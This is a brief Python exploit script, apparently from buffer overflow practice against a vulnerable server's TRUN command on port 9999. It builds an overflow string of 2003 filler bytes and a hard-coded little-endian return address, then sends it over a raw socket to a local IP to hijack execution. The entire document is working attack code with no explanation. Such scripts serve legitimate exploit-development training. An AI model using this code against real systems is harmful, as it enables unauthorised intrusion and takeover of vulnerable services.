import sys, socket

#625011af - return address

shellcode = 'TRUN /.:/' + "A" * 2003 + "\xaf\x11\x50\x62" #little endian

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.102', 9999))
s.send((shellcode.encode()))
s.close()
